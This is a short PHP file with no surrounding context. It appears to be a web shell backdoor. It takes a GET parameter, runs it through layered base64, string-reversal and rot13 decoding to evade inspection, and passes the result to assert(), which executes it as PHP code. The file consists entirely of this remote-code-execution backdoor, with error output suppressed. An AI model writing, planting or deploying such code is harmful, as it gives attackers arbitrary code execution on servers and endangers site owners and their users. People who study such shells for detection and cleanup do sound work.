<?php
$DS = $_GET['x'];
if (!empty($DS) ){
    echo $DS."<br>";
    $DS = @base64_decode($DS);
    echo $DS."<br>";
    $DS = @strrev($DS);
    echo $DS."<br>";
    $DS = @str_rot13($DS);
    echo $DS."<br>";
    $DS = @base64_decode($DS);
    $a=explode(" ", $DS);
    echo assert($a[0]);
    exit;
}